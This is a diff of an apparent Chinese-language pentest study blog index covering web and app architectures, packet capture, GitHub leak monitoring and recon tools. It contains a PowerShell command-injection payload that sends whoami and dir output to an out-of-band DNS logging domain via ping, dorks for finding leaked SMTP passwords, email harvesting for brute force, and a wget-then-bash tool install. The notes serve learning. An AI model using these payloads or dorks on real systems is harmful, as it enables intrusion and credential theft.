+<li>bbs.cypher.com 论讨 DZ程序</li>
+<li>oa.cypher.com OA 通达OA程序</li>
 </ol>
-<p>原理：利用别人大公司的域名模版建立，直接百度谷歌一搜就知道是不是分配站了<br>影响：实质安全测试非目标资产，而是测试大公司的网安系统，一般也没有人把重要文件放上去，源码不是自己的，域名不是自己的，服务器不是自己的</p>
-<br>
-
-<h2 id="静态Web："><a href="#静态Web：" class="headerlink" title="静态Web："></a>静态Web：</h2><p>例子：大学学的HTML设计的网站<br>原理：数据没有传输性（JS传输不算）<br>影响：无漏洞<br><br></p>
-<h2 id="伪静态："><a href="#伪静态：" class="headerlink" title="伪静态："></a>伪静态：</h2><p>动态转为静态技术，伪装的静态<br><br></p>
+<p>端口模式搭建:（这是两套完全不同的端口，就是两个目标）</p>
+<ol>
+<li>cypher.com ZBlog ASP程序（80默认端口）</li>
+<li>cypher.com:8080 WordPress PHP程序</li>
+</ol>
+<p>目录模式搭建:（这是两套是在一个目录里，但是是两个目标）</p>
+<ol>
+<li>cypher.com ZBlog ASP程序</li>
+<li>cypher.com&#x2F;blog WordPress PHP程序</li>
+</ol>
+<p>或者集成软件 &amp; Docker容器 &amp; 分配站等<br><br></p>
+<h2 id="源码类型"><a href="#源码类型" class="headerlink" title="源码类型"></a>源码类型</h2><p>开源：网上免费的源码，源码也分可见和不可见的（ZBlog）<br>商业：花钱找人开发，大部分源码不可见，加密（ASP加密软件），语言特性决定（Java）<br>自写：大型公司都是自写（百度，阿里都有自己的源码）</p>
+<p>源码的结构组成：数据库目录，后台目录，文件目录<br><br></p>
+<h2 id="源码和URL访问对应关系"><a href="#源码和URL访问对应关系" class="headerlink" title="源码和URL访问对应关系"></a>源码和URL访问对应关系</h2><p>绝对路径：C:\Users\Username\Documents\file.txt（写全的就是绝对路径）<br>相对路径：.\file.txt（没写全的就是相对路径，使用了.\代替）<br>例如mvc源码，Java和Python：URL和文件目录对应不上，上传到目录下，但是访问不到，必须按照特定的路由规则去配置决定<br><br></p>
+<h2 id="文件访问解析"><a href="#文件访问解析" class="headerlink" title="文件访问解析"></a>文件访问解析</h2><p>可以通过中间件来更改目录的文件访问权限<br>后门上传之后，要分有没有执行权限，没有权限无法读取和运行<br>但一般网站里面的文件不可能都锁，一般锁图片目录运行就可以了，不然所有目录都锁了，网站直接运行不了<br><br></p>
+<h2 id="站库分离，云数据库存储RDS，云对象存储OSS"><a href="#站库分离，云数据库存储RDS，云对象存储OSS" class="headerlink" title="站库分离，云数据库存储RDS，云对象存储OSS"></a>站库分离，云数据库存储RDS，云对象存储OSS</h2><p>本地一致：数据库就放在同服务器地址下<br>站库分离：另一台服务器存放数据库，或者使用云数据库RDS应用，云数据库都不用服务器并且还可以设置安全组，只允许某些IP连接，还有外连特性，绑定特性，阿里云Key等等更多方式连接站库分离的数据库，有账号密码都连不上，禁止外连<br><br></p>
+<h2 id="中间件配置影响后续手法"><a href="#中间件配置影响后续手法" class="headerlink" title="中间件配置影响后续手法"></a>中间件配置影响后续手法</h2><p>身份验证：Windows身份验证，绕过不了，必须要账号和密码<br>目录权限：防止后门上传并运行的<br>解析规则：MIME类型设置里，以不同的文件后缀名，该下载的下载，该打开的打开，如果更改了就会改变<br><br></p>
 ]]></content>
       <categories>
         <category>基础入门</category>
@@ -1485,6 +1365,150 @@
 <h2 id="正反向代理"><a href="#正反向代理" class="headerlink" title="正反向代理"></a>正反向代理</h2><p>正向代理你在客户端操作，客户端主动建立代理并访问目标（不代理不可达）在客户端操作，对服务端没影响<br>反向代理别人在服务端操作，服务端主动转发数据给可访问地址（不主动不可达）</p>
 <p>原理：通过反向代理转发真实服务达到访问目的<br>影响：访问目标只是一个代理，非真实应用服务器<br>注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！<br><br></p>
 <h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>原理：分摊到多个服务器来支撑服务，共同完成工作任务，一台服务器崩了还有备份<br>影响：有多个服务器加载服务，测试过程中存在多个目标情况</p>
+]]></content>
+      <categories>
+        <category>基础入门</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>公众号服务&amp;Github监控&amp;供应链&amp;网盘泄漏&amp;证书图标邮箱资产</title>
+    <url>/2024/03/12/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B921/</url>
+    <content><![CDATA[<h2 id="微信公众号-获取-三方服务"><a href="#微信公众号-获取-三方服务" class="headerlink" title="微信公众号-获取&amp;三方服务"></a>微信公众号-获取&amp;三方服务</h2><p>1、获取微信公众号途径 <a href="https://weixin.sogou.com/">搜狗搜索</a><br>2、微信公众号有无第三方服务<br>有些是个人企业服务，是否用的腾讯的网站功能接口，还是用的自己的网站<br><br></p>
+<h2 id="Github监控-开发-配置-源码"><a href="#Github监控-开发-配置-源码" class="headerlink" title="Github监控-开发&amp;配置&amp;源码"></a>Github监控-开发&amp;配置&amp;源码</h2><p>目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点</p>
+<p>人员&amp;域名&amp;邮箱等筛选语法网站<br>eg：xxx.cn password in:file</p>
+<p><a href="https://gitee.com/">Gitee</a><br><a href="https://github.com/">Github</a><br><a href="https://www.huzhan.com/">互站网</a></p>
+<br>
+
+<p>GITHUB资源搜索语法：</p>
+<table>
+<thead>
+<tr>
+<th>查询类型</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>仓库标题搜索含有关键字</td>
+<td><code>in:name test</code></td>
+</tr>
+<tr>
+<td>仓库描述搜索含有关键字</td>
+<td><code>in:description test</code></td>
+</tr>
+<tr>
+<td>Readme文件搜索含有关键字</td>
+<td><code>in:readme test</code></td>
+</tr>
+<tr>
+<td>stars数量大于3000的搜索关键字</td>
+<td><code>stars:&gt;3000 test</code></td>
+</tr>
+<tr>
+<td>stars数量在1000到3000的搜索关键字</td>
+<td><code>stars:1000..3000 test</code></td>
+</tr>
+<tr>
+<td>forks数量大于1000的搜索关键字</td>
+<td><code>forks:&gt;1000 test</code></td>
+</tr>
+<tr>
+<td>forks数量在1000到3000的搜索关键字</td>
+<td><code>forks:1000..3000 test</code></td>
+</tr>
+<tr>
+<td>仓库大小大于5000k的搜索关键字</td>
+<td><code>size:&gt;=5000 test</code></td>
+</tr>
+<tr>
+<td>发布时间大于2019-02-12的搜索关键字</td>
+<td><code>pushed:&gt;2019-02-12 test</code></td>
+</tr>
+<tr>
+<td>创建时间大于2019-02-12的搜索关键字</td>
+<td><code>created:&gt;2019-02-12 test</code></td>
+</tr>
+<tr>
+<td>用户名搜索</td>
+<td><code>user:test</code></td>
+</tr>
+<tr>
+<td>指定LICENSE搜索关键字</td>
+<td><code>license:apache-2.0 test</code></td>
+</tr>
+<tr>
+<td>在特定语言的代码中搜索关键字</td>
+<td><code>language:java test</code></td>
+</tr>
+<tr>
+<td>组合搜索</td>
+<td><code>user:test in:name test</code></td>
+</tr>
+</tbody></table>
+<br>
+
+<p>GITHUB关键字配合谷歌搜索：<br>site:Github.com smtp<br>site:Github.com smtp @qq.com<br>site:Github.com smtp @126.com<br>site:Github.com smtp @163.com<br>site:Github.com smtp @sina.com.cn<br>site:Github.com smtp password<br>site:Github.com String password smtp<br><br></p>
+<p>GITHUB语法固定长期后续监控新泄露<br>基于关键字监控<br>基于项目规则监控</p>
+<p><a href="https://github.com/madneal/gshark">gshark</a><br><a href="https://github.com/NHPT/FireEyeGoldCrystal">FireEyeGoldCrystal</a><br><a href="https://github.com/Explorer1092/Github-Monitor">Github-Monitor</a></p>
+<h2 id="网盘资源搜索-全局文件机密"><a href="#网盘资源搜索-全局文件机密" class="headerlink" title="网盘资源搜索-全局文件机密"></a>网盘资源搜索-全局文件机密</h2><p>主要就是查看网盘中是否存有目标的敏感文件<br>如：企业招标，人员信息，业务产品，应用源码等<br><br></p>
+<h2 id="网络空间进阶-证书-图标-邮箱"><a href="#网络空间进阶-证书-图标-邮箱" class="headerlink" title="网络空间进阶-证书&amp;图标&amp;邮箱"></a>网络空间进阶-证书&amp;图标&amp;邮箱</h2><p>证书资产搜索，进阶玩法<br>fofa quake hunter</p>
+<p>ICO资产搜索，进阶玩法<br>fofa quake hunter<br>下载目标图标，再在网络空间搜索，获得资源</p>
+<p>邮箱资产搜索，进阶玩法<br><a href="https://hunter.io/">hunter</a><br>搜索xxx.edu.cn来获得大量邮箱，然后通过邮箱信息进行爆破</p>
+]]></content>
+      <categories>
+        <category>信息打点</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Web架构&amp;前后端分离站&amp;Docker容器站&amp;集成软件站&amp;建站分配</title>
+    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A82/</url>
+    <content><![CDATA[<h2 id="Web常规化搭建："><a href="#Web常规化搭建：" class="headerlink" title="Web常规化搭建："></a>Web常规化搭建：</h2><p>原理：源码数据都在同服务器<br>影响：无，常规安全测试手法<br><br></p>
+<h2 id="站库分离："><a href="#站库分离：" class="headerlink" title="站库分离："></a>站库分离：</h2><p>原理：源码和数据库不在同服务器<br>存储：其他服务器上数据库&amp;云数据库产品<br>影响：数据库被单独存放，需要连接才可影响数据<br><br></p>
+<h2 id="前后端分离："><a href="#前后端分离：" class="headerlink" title="前后端分离："></a>前后端分离：</h2><p>原理：前端JS框架，API传输数据<br>影响：</p>
+<ol>
+<li>前端页面JS，HTML，Vue存在漏洞很少，采用API传输数据</li>
+<li>后端管理和目标网站大部分不在同一域名</li>
+<li>获得前端的权限有可能不影响后端<br>
+<br></li>
+</ol>
+<h2 id="集成软件（宝塔，phpStudy）："><a href="#集成软件（宝塔，phpStudy）：" class="headerlink" title="集成软件（宝塔，phpStudy）："></a>集成软件（宝塔，phpStudy）：</h2><p>原理：打包类集成化环境，权限配置或受控制，不同的搭建里面的权限设置都不一样<br>影响：攻击者权限对比区别，攻击不能执行</p>
+<p>宝塔：拿到权限后，文件锁定目录，无法看到上级目录，命令无法执行<br>phpStudy：拿到权限后，命令可以法执行<br>IIS：有的命令能执行，有的命令不能执行</p>
+<p>whoami查看权限，不同的东西搭建的网站安全性都不一样<br><br></p>
+<h2 id="Docker容器（Docker-Hub）："><a href="#Docker容器（Docker-Hub）：" class="headerlink" title="Docker容器（Docker Hub）："></a>Docker容器（Docker Hub）：</h2><p>原理：攻击者的安全目录和真实目录不一样，虚拟化技术独立磁盘空间，非真实物理环境<br>影响：所以攻击者是在虚拟空间磁盘，但是可以使用docker 逃逸到外面去</p>
+<p><a href="https://www.w3cschool.cn/docker/">Docker安装</a><br><a href="https://hub.docker.com/">Docker镜像</a><br><br></p>
+<h2 id="建站分配站："><a href="#建站分配站：" class="headerlink" title="建站分配站："></a>建站分配站：</h2><p>例如：凡科建站</p>
+<ol>
+<li>托管</li>
+<li>申请</li>
+</ol>
+<p>原理：利用别人大公司的域名模版建立，直接百度谷歌一搜就知道是不是分配站了<br>影响：实质安全测试非目标资产，而是测试大公司的网安系统，一般也没有人把重要文件放上去，源码不是自己的，域名不是自己的，服务器不是自己的</p>
+<br>
+
+<h2 id="静态Web："><a href="#静态Web：" class="headerlink" title="静态Web："></a>静态Web：</h2><p>例子：大学学的HTML设计的网站<br>原理：数据没有传输性（JS传输不算）<br>影响：无漏洞<br><br></p>
+<h2 id="伪静态："><a href="#伪静态：" class="headerlink" title="伪静态："></a>伪静态：</h2><p>动态转为静态技术，伪装的静态<br><br></p>
+]]></content>
+      <categories>
+        <category>基础入门</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>APP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter</title>
+    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A84/</url>
+    <content><![CDATA[<h2 id="APP应用开发架构："><a href="#APP应用开发架构：" class="headerlink" title="APP应用开发架构："></a>APP应用开发架构：</h2><ol>
+<li><p>原生开发<br>安卓一般使用Java语言开发，当然现在也有Kotlin语言进行开发。如何开发就涉及到具体编程了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p>
+</li>
+<li><p>使用HTML5语言开发<br>使用HTML5开发的好处有很多，可多端复用，比如浏览器端，iOS端，当然HTML5开发的体验是没有原生好的。一般是这个页面需要分享出去的话，就用HTML5开发。</p>
+</li>
+<li><p>使用Flutter开发<br>Flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，体验可媲美原生。但是Flutter技术比较新，生态还不完善，开发起来效率相对偏低。</p>
+</li>
+<li><p>常规Web开发<br>Web App软件开发简单地说，就是开发一个网站，然后加入App的壳。Web App一般非常小，内容都是App内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且App内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。使用一门，变色龙等，把电脑Web转成手机App版本</p>
+<br>
+<br></li>
+</ol>
+<h2 id="APP-开发架构-原生态-IDEA"><a href="#APP-开发架构-原生态-IDEA" class="headerlink" title="APP-开发架构-原生态-IDEA"></a>APP-开发架构-原生态-IDEA</h2><p>开发难度是最难的，但是效果是最好的<br>安全影响：反编译 &amp; 抓包 &amp; 提取出资产信息测试，逆向的角度去分析逻辑设计安全。<br><br></p>
+<h2 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h2><p>安全影响：本身就是Web，进行抓包Web安全测试<br><br></p>
+<h2 id="APP-开发架构-HTML5-Vue-HBuilderX"><a href="#APP-开发架构-HTML5-Vue-HBuilderX" class="headerlink" title="APP-开发架构-HTML5&amp;Vue-HBuilderX"></a>APP-开发架构-HTML5&amp;Vue-HBuilderX</h2><p>安全影响：API &amp; JS框架安全问题 &amp; JS前端测试，前后端分离，JS渗透测试，接口安全，框架安全测试<br><br></p>
+<h2 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h2><p>安全影响：本身就是Web，进行Web抓包安全测试<br><br></p>
+<h2 id="WX小程序-开发架构-H5-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h2><p>安全影响：API &amp; JS框架安全问题 &amp; JS前端测试</p>
 ]]></content>
       <categories>
         <category>基础入门</category>
@@ -1544,59 +1568,6 @@ Windows服务器防火墙策略:
 <p>并且cmd不支持赋值变量，但是PowerShell可以</p>
 <p>所以用PowerShell赋值whoami，然后使用带外网站再赋值网址，把数据带出来<br>但是由于Windows系统，结果带有“\” 导致ping无法执行<br>需要replace ‘&#39;为字母<br>最后就可以结果带出来了，ping到带外网站就可以直接带出Windows的数据了</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span>=<span class="built_in">whoami</span></span><br><span class="line"><span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="variable">$y</span>=<span class="string">&#x27;.47fa801887.ipv6.1433.eu.org.&#x27;</span></span><br><span class="line"><span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span></span><br><span class="line">ping <span class="variable">$z</span></span><br><span class="line"></span><br><span class="line">127.0.0.1 | powershell <span class="variable">$x</span>=<span class="built_in">dir</span>;<span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);<span class="variable">$y</span>=<span class="string">&#x27;.47fa801887.ipv6.1433.eu.org.&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;ping <span class="variable">$z</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>基础入门</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>抓包技术&amp;全局协议&amp;封包监听&amp;网卡模式&amp;APP&amp;小程序&amp;PC应用</title>
-    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A87/</url>
-    <content><![CDATA[<h2 id="实现目的："><a href="#实现目的：" class="headerlink" title="实现目的："></a>实现目的：</h2><ol>
-<li>掌握几种全局协议抓包工具的使用</li>
-<li>学会App，小程序，PC应用等协议抓包</li>
-<li>了解此课抓包是针对那些目标什么协议<br>
-<br></li>
-</ol>
-<h2 id="Wireshark："><a href="#Wireshark：" class="headerlink" title="Wireshark："></a>Wireshark：</h2><p>Wireshark是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPcap作为接口，直接与网卡进行数据报文交换。<br><br></p>
-<h2 id="科来网络分析系统："><a href="#科来网络分析系统：" class="headerlink" title="科来网络分析系统："></a>科来网络分析系统：</h2><p>科来是一款由全自主研发的网络分析产品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障，网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障，安全及性能问题。<br><br></p>
-<h2 id="WPE封包分析："><a href="#WPE封包分析：" class="headerlink" title="WPE封包分析："></a>WPE封包分析：</h2><p>封包监听工具分析是强大的网络封包编辑器，WPE可以截取网络上的信息，修改封包数据，是外挂制作的常用工具。一般在安全测试中可用来调试数据通讯地址。<br><br></p>
-<p>渗透测试角度：</p>
-<ol>
-<li>抓包得到应用的资产信息 - IP域名等</li>
-<li>IP和域名上的服务做测试（web攻防，端口 - 数据库等第三方软件等 其他服务攻防）</li>
-<li>API接口，OSS资源-云安全</li>
-</ol>
-<p>逆向破解角度：</p>
-<ol>
-<li>反编译源码中去找资产信息 来到渗透测试思路一样</li>
-<li>源码中泄露的 配置Key去测试安全性</li>
-<li>逆向 代码和产品的设计逻辑性（不规范的加密，可以绕过的策略 自己可以删除验证重新打包绕过验证等）</li>
-</ol>
-]]></content>
-      <categories>
-        <category>基础入门</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>APP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter</title>
-    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A84/</url>
-    <content><![CDATA[<h2 id="APP应用开发架构："><a href="#APP应用开发架构：" class="headerlink" title="APP应用开发架构："></a>APP应用开发架构：</h2><ol>
-<li><p>原生开发<br>安卓一般使用Java语言开发，当然现在也有Kotlin语言进行开发。如何开发就涉及到具体编程了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p>
-</li>
-<li><p>使用HTML5语言开发<br>使用HTML5开发的好处有很多，可多端复用，比如浏览器端，iOS端，当然HTML5开发的体验是没有原生好的。一般是这个页面需要分享出去的话，就用HTML5开发。</p>
-</li>
-<li><p>使用Flutter开发<br>Flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，体验可媲美原生。但是Flutter技术比较新，生态还不完善，开发起来效率相对偏低。</p>
-</li>
-<li><p>常规Web开发<br>Web App软件开发简单地说，就是开发一个网站，然后加入App的壳。Web App一般非常小，内容都是App内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且App内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。使用一门，变色龙等，把电脑Web转成手机App版本</p>
-<br>
-<br></li>
-</ol>
-<h2 id="APP-开发架构-原生态-IDEA"><a href="#APP-开发架构-原生态-IDEA" class="headerlink" title="APP-开发架构-原生态-IDEA"></a>APP-开发架构-原生态-IDEA</h2><p>开发难度是最难的，但是效果是最好的<br>安全影响：反编译 &amp; 抓包 &amp; 提取出资产信息测试，逆向的角度去分析逻辑设计安全。<br><br></p>
-<h2 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h2><p>安全影响：本身就是Web，进行抓包Web安全测试<br><br></p>
-<h2 id="APP-开发架构-HTML5-Vue-HBuilderX"><a href="#APP-开发架构-HTML5-Vue-HBuilderX" class="headerlink" title="APP-开发架构-HTML5&amp;Vue-HBuilderX"></a>APP-开发架构-HTML5&amp;Vue-HBuilderX</h2><p>安全影响：API &amp; JS框架安全问题 &amp; JS前端测试，前后端分离，JS渗透测试，接口安全，框架安全测试<br><br></p>
-<h2 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h2><p>安全影响：本身就是Web，进行Web抓包安全测试<br><br></p>
-<h2 id="WX小程序-开发架构-H5-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h2><p>安全影响：API &amp; JS框架安全问题 &amp; JS前端测试</p>
-]]></content>
       <categories>
         <category>基础入门</category>
       </categories>
@@ -1673,6 +1644,35 @@ Windows服务器防火墙策略:
 <h2 id="Charles："><a href="#Charles：" class="headerlink" title="Charles："></a>Charles：</h2><p>Charles是一个HTTP代理服务器,HTTP监视器，反转代理服务器，当浏览器连接Charles的代理访问互联网时，Charles可以监控浏览器发送和接收的所有数据。它允许一个开发者查看所有连接互联网的HTTP通信，这些包括request, response和headers（包含cookies信息）。</p>
 <p>tcpdump：是可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层，协议，主机，网络或端口的过滤，并提供and，or，not等逻辑语句来帮助你去掉无用的信息。<br><br></p>
 <h2 id="Burp-Suite："><a href="#Burp-Suite：" class="headerlink" title="Burp Suite："></a>Burp Suite：</h2><p>Burp Suite是用于测试Web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快测试应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息，持久性，认证，代理，日志，警报。</p>
+]]></content>
+      <categories>
+        <category>基础入门</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>抓包技术&amp;全局协议&amp;封包监听&amp;网卡模式&amp;APP&amp;小程序&amp;PC应用</title>
+    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A87/</url>
+    <content><![CDATA[<h2 id="实现目的："><a href="#实现目的：" class="headerlink" title="实现目的："></a>实现目的：</h2><ol>
+<li>掌握几种全局协议抓包工具的使用</li>
+<li>学会App，小程序，PC应用等协议抓包</li>
+<li>了解此课抓包是针对那些目标什么协议<br>
+<br></li>
+</ol>
+<h2 id="Wireshark："><a href="#Wireshark：" class="headerlink" title="Wireshark："></a>Wireshark：</h2><p>Wireshark是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPcap作为接口，直接与网卡进行数据报文交换。<br><br></p>
+<h2 id="科来网络分析系统："><a href="#科来网络分析系统：" class="headerlink" title="科来网络分析系统："></a>科来网络分析系统：</h2><p>科来是一款由全自主研发的网络分析产品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障，网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障，安全及性能问题。<br><br></p>
+<h2 id="WPE封包分析："><a href="#WPE封包分析：" class="headerlink" title="WPE封包分析："></a>WPE封包分析：</h2><p>封包监听工具分析是强大的网络封包编辑器，WPE可以截取网络上的信息，修改封包数据，是外挂制作的常用工具。一般在安全测试中可用来调试数据通讯地址。<br><br></p>
+<p>渗透测试角度：</p>
+<ol>
+<li>抓包得到应用的资产信息 - IP域名等</li>
+<li>IP和域名上的服务做测试（web攻防，端口 - 数据库等第三方软件等 其他服务攻防）</li>
+<li>API接口，OSS资源-云安全</li>
+</ol>
+<p>逆向破解角度：</p>
+<ol>
+<li>反编译源码中去找资产信息 来到渗透测试思路一样</li>
+<li>源码中泄露的 配置Key去测试安全性</li>
+<li>逆向 代码和产品的设计逻辑性（不规范的加密，可以绕过的策略 自己可以删除验证重新打包绕过验证等）</li>
+</ol>
 ]]></content>
       <categories>
         <category>基础入门</category>
@@ -1835,6 +1835,26 @@ Windows服务器防火墙策略:
       </tags>
   </entry>
   <entry>
+    <title>F8x</title>
+    <url>/2024/03/11/%E5%B7%A5%E5%85%B7F8x/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/ffffffff0x/f8x">F8x</a></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>一款红&#x2F;蓝队环境自动化部署工具,支持多种场景，渗透，开发，代理环境，服务可选项等。</p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
+<li><p>阿里云，购买Ubuntu 18.04服务器</p>
+</li>
+<li><p>连接Ubuntu服务器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">wget -O f8x https://f8x.io/</span><br><span class="line">bash f8x -h</span><br></pre></td></tr></table></figure>
+<br></li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>武器库部署</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ENScan_GO</title>
     <url>/2024/03/11/%E5%B7%A5%E5%85%B7ENScan_GO/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a></p>
@@ -1854,26 +1874,6 @@ Windows服务器防火墙策略:
       </categories>
       <tags>
         <tag>企查信息</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>F8x</title>
-    <url>/2024/03/11/%E5%B7%A5%E5%85%B7F8x/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/ffffffff0x/f8x">F8x</a></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>一款红&#x2F;蓝队环境自动化部署工具,支持多种场景，渗透，开发，代理环境，服务可选项等。</p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
-<li><p>阿里云，购买Ubuntu 18.04服务器</p>
-</li>
-<li><p>连接Ubuntu服务器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">wget -O f8x https://f8x.io/</span><br><span class="line">bash f8x -h</span><br></pre></td></tr></table></figure>
-<br></li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>武器库部署</tag>
       </tags>
   </entry>
   <entry>
@@ -1901,21 +1901,17 @@ Windows服务器防火墙策略:
       </tags>
   </entry>
   <entry>
-    <title>工具FireEyeGoldCrystal</title>
-    <url>/2024/03/12/%E5%B7%A5%E5%85%B7FireEyeGoldCrystal/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/NHPT/FireEyeGoldCrystal">FireEyeGoldCrystal</a></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>火眼金睛是一个GitHub监控和信息收集工具，支持监控和收集CVE、免杀、漏洞利用等内置关键字和自定义关键字。支持钉钉、Server酱和Telegram推送，过滤敏感词，查找包含关键字的所有仓库并输出到FEGC.xlsx文件。默认关键字列表有限，可通过文件指定关键字和敏感词，由于GitHub API速率限制，目前仅实现单线程。</p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
-<li><p>FireEyeGoldCrystal.py配置关键字列表</p>
+    <title>Github-Monitor</title>
+    <url>/2024/03/11/%E5%B7%A5%E5%85%B7Github-Monitor/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Explorer1092/Github-Monitor">Github-Monitor</a></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>GITHUB MONITOR 是vipkid安全研发团队打造的用于监控Github代码仓库的系统。通过该系统可以及时发现企业内部代码泄露、从而降低由于代码泄露导致的一系列安全风险。用户仅需通过简单的任务配置，即可在分钟级发现代码泄露的情况。项目后端使用 django-rest-framework 开发，前端使用 react 和 antd-pro 开发。</p>
+<h2 id="搭建流程："><a href="#搭建流程：" class="headerlink" title="搭建流程："></a>搭建流程：</h2><ol>
+<li><p>阿里云购买Ubuntu 18.04服务器</p>
 </li>
-<li><p>search.txt写入搜索目标</p>
-</li>
-<li><p>目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FireEyeGoldCrystal.py -h</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>目录下会生成表格</p>
-</li>
+<li><p>连接服务器</p>
